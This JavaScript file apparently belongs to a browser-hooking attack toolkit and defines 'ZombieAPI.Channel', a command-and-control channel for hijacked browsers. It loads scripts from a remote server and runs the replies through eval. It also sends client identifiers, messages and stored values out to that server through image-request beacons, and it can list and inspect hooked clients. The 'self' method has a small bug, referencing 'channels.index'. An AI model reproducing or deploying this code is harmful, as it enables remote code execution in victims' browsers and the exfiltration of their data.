ZombieAPI.Channel = {};
ZombieAPI.channels = new Array();
ZombieAPI.Channel.createInteractiveChannel = function (location) {
	function do_script_request(location) {
		var script = document.createElement('script');
		script.defer = true;
		script.type = 'text/javascript';
		script.src = location + '&_request=' + escape(Math.random() + '-' + Math.random());
		script.onload = script.onerror = function () {
			document.body.removeChild(script);
		};
		
		document.body.appendChild(script);		
	}
	
	function do_image_request(location) {
		var request = new Image();
		request.src = location + '&_request=' + escape(Math.random() + '-' + Math.random());
	}
	
	var channel = {
		index: ZombieAPI.channels.length,
		location: location};
		
	channel.onpush = channel.onlist = channel.onview = channel.onself = channel.onsave = function (){ return true };
	channel.onpull = function (message) {
		eval(message);
	};	
	channel.pull = function () {
		do_script_request(channel.location + '?action=pull&callback=ZombieAPI.channels.channel' + channel.index + '.onpull');
		return true;
	};
	channel.push = function (client, message, target) {
		if (!channel.onpush(client, message))
			return false;
			
		do_image_request(channel.location + '?action=push&client=' + escape(client) + '&message=' + escape(message) + ((target == undefined)?'':'&target=' + escape(target)));
		return true;
	};
	channel.list = function () {
		do_script_request(channel.location + '?action=list&callback=ZombieAPI.channels.channel' + channel.index + '.onlist');
		return true;
	};
	channel.view = function (client) {
		do_script_request(channel.location + '?action=view&client=' + escape(client) + '&callback=ZombieAPI.channels.channel' + channel.index + '.onview');
		return true;
	};
	channel.self = function () {
		do_script_request(channel.location + '?action=self&callback=ZombieAPI.channels.channel' + channels.index + '.onself');
		return true;
	};
	channel.save = function (client, name, value) {
		if (!channel.onsave(client, name, value))
			return false;
			
		do_image_request(channel.location + '?action=save&client=' + escape(client) + '&name=' + escape(name) + '&value=' + escape(value));
		return true;
	};
	
	ZombieAPI.channels['channel' + channel.index] = channel;
	return channel;
};
